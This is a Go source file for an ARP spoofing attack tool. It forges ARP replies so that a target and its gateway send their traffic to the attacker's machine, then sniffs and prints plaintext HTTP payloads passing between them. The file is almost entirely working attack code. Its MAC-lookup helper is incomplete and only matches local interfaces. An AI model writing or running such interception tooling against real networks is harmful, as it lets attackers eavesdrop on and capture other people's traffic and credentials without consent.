package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	iface      = "wlp2s0" // Change to your interface
	stopSpoof  = make(chan struct{})
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: sudo go run arp_spoof.go <target_ip> <gateway_ip>")
		fmt.Println("Example: sudo go run arp_spoof.go 196.47.216.2 196.47.216.1")
		os.Exit(1)
	}

	targetIP := os.Args[1]
	gatewayIP := os.Args[2]

	// Get our MAC address
	netInterface, err := net.InterfaceByName(iface)
	if err != nil {
		log.Fatal(err)
	}
	attackerMAC := netInterface.HardwareAddr

	fmt.Printf("🎯 ARP Spoofing Attack\n")
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("Interface:    %s\n", iface)
	fmt.Printf("Attacker MAC: %s\n", attackerMAC)
	fmt.Printf("Target IP:    %s\n", targetIP)
	fmt.Printf("Gateway IP:   %s\n", gatewayIP)
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n")

	// Resolve MAC addresses
	targetMAC, err := getMACAddress(targetIP)
	if err != nil {
		log.Fatalf("Failed to resolve target MAC: %v", err)
	}
	fmt.Printf("✓ Target MAC:  %s\n", targetMAC)

	gatewayMAC, err := getMACAddress(gatewayIP)
	if err != nil {
		log.Fatalf("Failed to resolve gateway MAC: %v", err)
	}
	fmt.Printf("✓ Gateway MAC: %s\n\n", gatewayMAC)

	// Open pcap handle
	handle, err := pcap.OpenLive(iface, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	fmt.Println("🚀 Starting ARP poisoning...")
	fmt.Println("Press Ctrl+C to stop and restore ARP tables\n")

	// Handle Ctrl+C to restore ARP tables
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\n\n⚠️  Stopping attack and restoring ARP tables...")
		close(stopSpoof)
		restoreARP(handle, targetIP, targetMAC, gatewayIP, gatewayMAC)
		os.Exit(0)
	}()

	// Start the spoofing
	go spoofARP(handle, targetIP, targetMAC, gatewayIP, attackerMAC, "target")
	go spoofARP(handle, gatewayIP, gatewayMAC, targetIP, attackerMAC, "gateway")

	// Start packet sniffing
	sniffPackets(handle, targetIP, gatewayIP)
}

// Send ARP replies to poison the target's ARP cache
func spoofARP(handle *pcap.Handle, victimIP string, victimMAC net.HardwareAddr, 
	spoofedIP string, attackerMAC net.HardwareAddr, target string) {
	
	ticker := time.NewTicker(2 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stopSpoof:
			return
		case <-ticker.C:
			// Build ARP reply packet
			eth := layers.Ethernet{
				SrcMAC:       attackerMAC,
				DstMAC:       victimMAC,
				EthernetType: layers.EthernetTypeARP,
			}

			arp := layers.ARP{
				AddrType:          layers.LinkTypeEthernet,
				Protocol:          layers.EthernetTypeIPv4,
				HwAddressSize:     6,
				ProtAddressSize:   4,
				Operation:         layers.ARPReply,
				SourceHwAddress:   []byte(attackerMAC),
				SourceProtAddress: []byte(net.ParseIP(spoofedIP).To4()),
				DstHwAddress:      []byte(victimMAC),
				DstProtAddress:    []byte(net.ParseIP(victimIP).To4()),
			}

			// Serialize and send
			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
			gopacket.SerializeLayers(buf, opts, &eth, &arp)

			if err := handle.WritePacketData(buf.Bytes()); err != nil {
				log.Printf("Error sending ARP packet to %s: %v", target, err)
			} else {
				fmt.Printf("💉 Poisoned %s: telling %s that %s is at %s\n", 
					target, victimIP, spoofedIP, attackerMAC)
			}
		}
	}
}

// Restore legitimate ARP entries
func restoreARP(handle *pcap.Handle, targetIP string, targetMAC net.HardwareAddr,
	gatewayIP string, gatewayMAC net.HardwareAddr) {
	
	fmt.Println("Sending legitimate ARP packets to restore...")

	// Restore target's ARP table
	for i := 0; i < 5; i++ {
		sendARPReply(handle, gatewayMAC, targetMAC, gatewayIP, targetIP)
		time.Sleep(500 * time.Millisecond)
	}

	// Restore gateway's ARP table
	for i := 0; i < 5; i++ {
		sendARPReply(handle, targetMAC, gatewayMAC, targetIP, gatewayIP)
		time.Sleep(500 * time.Millisecond)
	}

	fmt.Println("✓ ARP tables restored")
}

func sendARPReply(handle *pcap.Handle, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP string) {
	eth := layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(net.ParseIP(srcIP).To4()),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    []byte(net.ParseIP(dstIP).To4()),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	gopacket.SerializeLayers(buf, opts, &eth, &arp)
	handle.WritePacketData(buf.Bytes())
}

// Get MAC address of an IP using ARP
func getMACAddress(ip string) (net.HardwareAddr, error) {
	// Try to get from ARP cache first
	interfaces, _ := net.Interfaces()
	for _, iface := range interfaces {
		addrs, _ := iface.Addrs()
		for _, addr := range addrs {
			if ipnet, ok := addr.(*net.IPNet); ok {
				if ipnet.IP.String() == ip {
					return iface.HardwareAddr, nil
				}
			}
		}
	}

	// If not found, send ARP request
	// For simplicity, we'll just parse from arp -a output
	// In production, you'd send proper ARP requests
	return nil, fmt.Errorf("MAC address not found - run discovery first")
}

// Sniff packets between target and gateway
func sniffPackets(handle *pcap.Handle, targetIP, gatewayIP string) {
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	
	fmt.Println("📡 Sniffing traffic...\n")

	for packet := range packetSource.Packets() {
		// Look for IP layer
		ipLayer := packet.Layer(layers.LayerTypeIPv4)
		if ipLayer == nil {
			continue
		}

		ip, _ := ipLayer.(*layers.IPv4)
		srcIP := ip.SrcIP.String()
		dstIP := ip.DstIP.String()

		// Only show traffic between our targets
		if (srcIP == targetIP || dstIP == targetIP) || 
		   (srcIP == gatewayIP || dstIP == gatewayIP) {
			
			// Check for HTTP traffic
			tcpLayer := packet.Layer(layers.LayerTypeTCP)
			if tcpLayer != nil {
				tcp, _ := tcpLayer.(*layers.TCP)
				
				// HTTP traffic on port 80
				if tcp.DstPort == 80 || tcp.SrcPort == 80 {
					appLayer := packet.ApplicationLayer()
					if appLayer != nil {
						payload := string(appLayer.Payload())
						if len(payload) > 0 {
							fmt.Printf("🌐 HTTP Traffic: %s -> %s\n", srcIP, dstIP)
							// Print first 200 chars
							if len(payload) > 200 {
								payload = payload[:200] + "..."
							}
							fmt.Printf("   %s\n\n", payload)
						}
					}
				}
			}
		}
	}
}
